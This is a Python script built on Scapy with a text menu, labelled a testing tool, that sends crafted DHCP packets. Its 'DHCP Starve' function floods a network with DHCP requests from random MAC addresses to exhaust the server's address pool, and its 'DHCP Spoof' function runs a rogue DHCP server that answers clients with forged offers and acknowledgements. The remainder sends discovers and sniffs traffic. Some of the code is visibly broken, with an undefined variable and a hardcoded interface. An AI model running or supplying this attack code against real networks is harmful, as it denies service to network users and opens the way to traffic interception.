#!/usr/bin/python3
   
from scapy.all import *
from threading import Thread, Event
from time import sleep
import curses
import os
from ipaddress import IPv4Address
import socket, struct

class DhcpStarve:
    def __init__(self):
        '''Preparation'''
        self.starvedIPs = []
        self.stop_sniffer = Event()     #to stop scapy sniff in method listen()
    
    def listen(self):
        '''Sniff for dhcp packets.'''
        sniff(filter="udp and (port 67 or port 68)",
              prn=self.handle_dhcp,
              store=0,
              stop_filter=self.should_stop_sniffer)
        
    def should_stop_sniffer(self, packet):
        '''Sets Event to stop scapy sniff method'''
        return self.stop_sniffer.isSet()  #to stop scapy sniff in method listen()
    
    def handle_dhcp(self, pkt):
        '''Reacts to dhcp response.'''
        if pkt[DHCP]:
            print('')
            if pkt[DHCP].options[0][1]==5:                 #5 is DHCPACK
                self.starvedIPs.append(pkt[IP].dst)
                print(str(pkt[IP].dst)+" succesfully registered")
            elif pkt[DHCP].options[0][1]==6:               #6 is DHCPNAK
                print("DHCP NAK: ", end="")
                print(pkt[DHCP].options[2][1].decode())    #error msg
            elif pkt[DHCP].options[0][1]==2:               #2 is DHCPOFFER
                print("DHCP OFFER:: \n{}".format(pkt[DHCP].options))
            elif pkt[DHCP].options[0][1]==3:               #3 is DHCPREQUEST
                print("DHCP REQUEST: \n{}".format(pkt[DHCP].options))
            elif pkt[DHCP].options[0][1]==1:               #1 is DHCPDISCOVER
                print("DHCP DISCOVER: \n{}".format(pkt[DHCP].options))
            else:
                print ("DHCP with options: {}".format(pkt[DHCP].options))
            
        else: return False

    def _sniff_wrapper(sendPacketMethod):
        '''Launches sniffing process around another passed method'''
        def wrapper(self,*args, **kwargs):
            listenProcess = Thread(target=self.listen)
            listenProcess.start()
            sleep(0.5)
            sendPacketMethod(self,*args, **kwargs)
            sleep(0.5)
            self.stop_sniffer.set() #to stop scapy sniff in method listen()
            input('Press Enter to come back to menu.')
        return wrapper  
 
    @_sniff_wrapper
    def discover(self):
        '''Use method to send dhcp discover.'''
        # craft DHCP DISCOVER
        dhcpDiscover = Ether(src=LOCALMAC, dst='ff:ff:ff:ff:ff:ff')
        dhcpDiscover/= IP(src='0.0.0.0', dst='255.255.255.255')
        dhcpDiscover/= UDP(dport=67, sport=68)
        dhcpDiscover/= BOOTP(chaddr=LOCALMACRAW,xid=RandInt())
        dhcpDiscover/= DHCP(options=[('message-type', 'discover'), 'end'])
        # start listening and send packet
        sendp(dhcpDiscover,iface=LOCALIFACE)  
        
    @_sniff_wrapper
    def starve(self,startIP,limit):
        '''Generate DHCP requests in loop'''
        for requestedIP in self.nextIP(startIP,limit):
            dhcpRequest = Ether(src=LOCALMAC, dst='ff:ff:ff:ff:ff:ff')
            dhcpRequest/= IP(src='0.0.0.0', dst='255.255.255.255')
            dhcpRequest/= UDP(dport=67, sport=68)
            dhcpRequest/= BOOTP(chaddr=RandString(12, b"0123456789abcdef"),xid=RandInt())
            dhcpRequest/= DHCP(options=[("message-type", "request"),
                                             ("requested_addr", requestedIP),
                                             ("server_id", "192.168.31.1"),
                                             "end"])
            dhcpResp = sendp(dhcpRequest,iface=LOCALIFACE)
            print('Requesting for IP: {}'.format(requestedIP))
            sleep(0.5)
        print('Succesfully starved IPs: {}'.format(self.starvedIPs))
        
    def spoofing(self):
        '''Starts DHCP server'''
        def handle_dhcp(pkt):
            if pkt[DHCP].options[0][1]==1: #if DHCP DISCOVER
                print("Received DISCOVER, Sending OFFER")
                self.offer(pkt[Ether].src,LOCALIP,'172.18.100.100','255.255.255.0')
            elif paquete[DHCP].options[0][1]== 3: #if DHCP REQUEST
                print("Received REQUEST, Sending ACK")
                self.dhcpack(pkt[Ether].src,LOCALIP,'172.18.100.100','255.255.255.0')
                
        listenProcess = Thread(target=sniff(
              filter="udp and (port 67 or port 68)",
              prn=handle_dhcp,
              store=0,
              stop_filter=self.should_stop_sniffer))
        
        listenProcess.start()
        
    def offer(self,dstMAC,srcIP,client_ip,mask):
        '''Generate DHCP offer packet'''
        dhcpOffer = Ether(src=LOCALMAC, dst=dstMAC)
        dhcpOffer/= IP(src=srcIP, dst='255.255.255.255')
        dhcpOffer/= UDP(dport=68, sport=67)
        dhcpOffer/= BOOTP(chaddr=LOCALMACRAW,
                          xid=RandInt(),
                          yiaddr=client_ip,
                          siaddr=srcIP, 
                          giaddr=srcIP)
        dhcpOffer /= DHCP(options=[("message-type", "offer"),
                                         ("subnet_mask", mask),
                                         ("server_id", srcIP),
                                         "end"])
        dhcpResp = sendp(dhcpOffer,iface=LOCALIFACE)
        
    def dhcpack(self,dstMAC,srcIP,client_ip,mask):
        '''Generate DHCP request packet'''
        dhcpack = Ether(src=LOCALMAC, dst=dstMAC)
        dhcpack/= IP(src=srcIP, dst='255.255.255.255')
        dhcpack/= UDP(dport=68, sport=67)
        dhcpack/= BOOTP(chaddr=LOCALMACRAW,
                          xid=RandInt(),
                          yiaddr=client_ip,
                          siaddr=srcIP, 
                          giaddr=srcIP) 
        dhcpack /= DHCP(options=[("message-type", "ack"),
                                         ("subnet_mask", mask),
                                         ("server_id", srcIP),
                                         "end"])
        dhcpResp = sendp(dhcpack,iface=LOCALIFACE)
        
    @_sniff_wrapper                            
    def sniffing(self):
        '''Just snffing with _sniff_wrapper method '''
        print('Starting sniffing for DHCP packets on interface: {}'.format(LOCALIFACE))
        input('Press Enter to stop')
    
    def nextIP(self,startIP,limit):
        '''Provides next ip addresses from some start IP, number of given addresses is limited'''
        for i in range(limit):
            try: 
                ip = IPv4Address(startIP) + i   
            except Exception as e:
                print(e)
                break
            yield IPv4Address(startIP) + i
    

class Menu:
    '''Menu made with curses'''
    def __init__(self,menuItems):
        '''Declaration of strings'''
        self.title = "Testing tool based on Scapy"
        self.menuItemsHint = "Choose an option or press q to quit:"
        self.menuItems = menuItems
        self.subtitle = "v0.3 , Jarek J"
        curses.wrapper(self.draw_menu)
        
    def draw_menu(self,stdscr):
        '''Draws menu with curses'''
        key = 0
        self.menuHighlight=0
        self.stdscr = stdscr
        # Clear and refresh the screen for a blank canvas
        self.stdscr.clear()
        self.stdscr.refresh()
        curses.curs_set(0) #hide cursor

        # Start colors in curses
        curses.start_color()
        curses.init_pair(1, curses.COLOR_CYAN, curses.COLOR_BLACK)
        curses.init_pair(2, curses.COLOR_RED, curses.COLOR_BLACK)
        curses.init_pair(3, curses.COLOR_BLACK, curses.COLOR_WHITE)
        curses.init_pair(4, curses.COLOR_BLACK, curses.COLOR_GREEN) #highlighted menu line

        # Initialization
        self.stdscr.clear()
        height, width = self.stdscr.getmaxyx()


        while (key != ord('q')): 
            # Centering calculations
            self.start_x_title = int((width // 2) - (len(self.title) // 2) - len(self.title) % 2)
            start_x_subtitle = int((width // 2) - (len(self.subtitle) // 2) - len(self.subtitle) % 2)
            self.start_y = int((height // 2) - 10)
            
            #menu actions:
            if   key == curses.KEY_DOWN and self.menuHighlight < len(self.menuItems)-1:  self.menuHighlight += 1
            elif key == curses.KEY_UP and self.menuHighlight > 0:                        self.menuHighlight -= 1
            if   key == 10 and self.menuHighlight == 0:                     #10 is ENTER
                self.choose_starving()
            if   key == 10 and self.menuHighlight == 1:                    
                self.choose_spoofing() 
            if   key == 10 and self.menuHighlight == 2:                     
                self.choose_discover()                                         
            if   key == 10 and self.menuHighlight == 3:                     
                self.choose_sniffing()       
                
            # Render status bar
            self.stdscr.attron(curses.color_pair(3))
            self.stdscr.attroff(curses.color_pair(3))

            # print texts
            self.stdscr.attron(curses.color_pair(2))
            self.stdscr.attron(curses.A_BOLD)
            self.stdscr.addstr(self.start_y, self.start_x_title, self.title)
            self.stdscr.attroff(curses.color_pair(2))
            self.stdscr.attroff(curses.A_BOLD)

            self.stdscr.addstr(self.start_y + 2, self.start_x_title, self.menuItemsHint)

            for index,line in enumerate(self.menuItems): #display menu items
                if index == self.menuHighlight: self.stdscr.attron(curses.color_pair(4))
                self.stdscr.addstr(self.start_y + index+4, self.start_x_title, line)
                if index == self.menuHighlight: self.stdscr.attroff(curses.color_pair(4))

            self.stdscr.addstr(self.start_y + len(self.menuItems)+6, self.start_x_title, '-' * len(self.subtitle))
            self.stdscr.addstr(self.start_y + len(self.menuItems)+7, self.start_x_title, self.subtitle)

            #refresh and wait for input
            self.stdscr.refresh()
            key = self.stdscr.getch()
        curses.endwin()
        os._exit(0)
      
    def string_input(self,stdscr, x, y, prompt):
        '''Displays prompt and returns user input (on x/y coordinates)'''
        curses.echo() 
        self.stdscr.addstr(y, x, prompt)
        self.stdscr.refresh()
        input = self.stdscr.getstr(y, x+len(prompt), 20)
        self.stdscr.move(y,x)
        self.stdscr.clrtoeol()
        return input  
    
    def choose_starving(self):
        '''Initiate dhcp Starve menu option'''
        startIP = self.string_input(self.stdscr, self.start_x_title+15, self.start_y+self.menuHighlight+4, 'Enter start IP: ')
        limit = self.string_input(self.stdscr, self.start_x_title+15, self.start_y+self.menuHighlight+4, 'Enter limit of IPs: ')
        curses.endwin()
        dhcp = DhcpStarve()
        return dhcp.starve(startIP.decode(),int(limit))
        
    def choose_spoofing(self):
        '''Initiate dhcp spoofing menu option'''
        curses.endwin()
        dhcp = DhcpStarve()
        return dhcp.spoofing()
        
    def choose_discover(self):
        '''Initiate dhcp discover menu option'''
        curses.endwin()
        dhcp = DhcpStarve()
        return dhcp.discover()
        
    def choose_sniffing(self):
        '''Initiate dhcp sniff menu option'''
        curses.endwin()
        dhcp = DhcpStarve()
        return dhcp.sniffing()


def get_network_def():
    """Read the default gateway directly from /proc, returns dict {'defGW':.., 'dev':.., 'GWmac':.., 'mac':.., 'ip':..}"""
    subprocess.run(['ping','-c','1','4.2.2.2'],stdout=subprocess.PIPE,stderr=subprocess.PIPE)  #to get some ARP entry for default gateway
    output={}
    #Default gateway ip
    try:
        with open("/proc/net/route") as fh:
            for line in fh:
                fields = line.strip().split()
                if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                    continue
                output.update({'defGW': socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))})
    except Exception as e:
        print('Error while checking default gateway in /proc/net/route')
        print(e.message, e.args)
    #Interface name and MAC of default gateway
    try:
        with open("/proc/net/arp") as fh:
            for line in fh:
                if output.get('defGW') == line.split()[0]:
                    output.update({'dev': line.split()[5].strip()})
                    output.update({'GWmac': line.split()[3]})
                    break
    except Exception as e:
        print('Error while checking default gateway in /proc/net/arp')
        print(e.message, e.args)
    #Interface MAC        
    try:
        with open("/sys/class/net/{}/address".format(output.get('dev'))) as fh:
            for line in fh:
                output.update({'mac': line.strip()})
    except Exception as e:
        print('Error while checking mac address in /sys/class/net/{}/address'.format(output.get('dev')))
        print(e.message, e.args)
              
    #Interface IP   
    ipcmd = subprocess.run(['ifconfig','wlan0'],stdout=subprocess.PIPE,stderr=subprocess.PIPE).stdout.decode().split('\n')
    try:
        ip= ''.join([line.split()[1] for line in ipcmd if 'broadcast' in line])
        output.update({'ip': ip})
    except Exception as e:
        print('Error while checking IP in ifconfig')
        print(e.message, e.args)

    return output


# configuration
network_data=get_network_def()
LOCALIFACE = network_data.get('dev')
REQUESTMAC = network_data.get('mac')
LOCALIP = network_data.get('ip')
MYHOSTNAME='host'
LOCALMAC = get_if_hwaddr(LOCALIFACE)
LOCALMACRAW = bytes.fromhex(REQUESTMAC.replace(':',''))

def main():
    while 1:
        menuObj = Menu(['DHCP Starve', 'DHCP Spoof', 'DHCP Discover', 'Sniff for DHCP Packets'])
        
if __name__ == '__main__':
	main()



